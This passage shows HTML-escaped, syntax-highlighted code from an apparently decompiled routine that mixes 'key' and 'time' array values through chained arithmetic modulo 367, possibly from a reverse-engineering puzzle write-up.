    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ((a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v6 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]
    v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]
    v12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (((v9 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v8 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ((key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v11 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v12 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;)
    v15 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;]
    v16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v13 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v15 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v16
    v19 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;]
    v21 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (((key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v17 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v19 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v22 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;]
    v24 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (v21 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v22 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v25 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;]
    v26 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (((key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ((v24 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v25 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v28 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;]
    v29 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v26 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ((&lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (v26 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;)
    v30 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v29 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v28 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]
    v32 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;]
    v34 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ((key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v30 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v32 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v35 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;]
    v37 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (((((key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (v34 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v35 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16F&lt;/span&gt;
    v38 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;]
    v40 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (v37 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v38) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v41 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;]
    v43 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v40 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v41 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v44 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;]
    v46 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ((key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ((key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v43 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v44 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v47 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;]
    v49 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (v46 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v47 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v50 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;]
    v52 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((&lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v49 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v50 &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;367&lt;/span&gt;
    v53 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;]
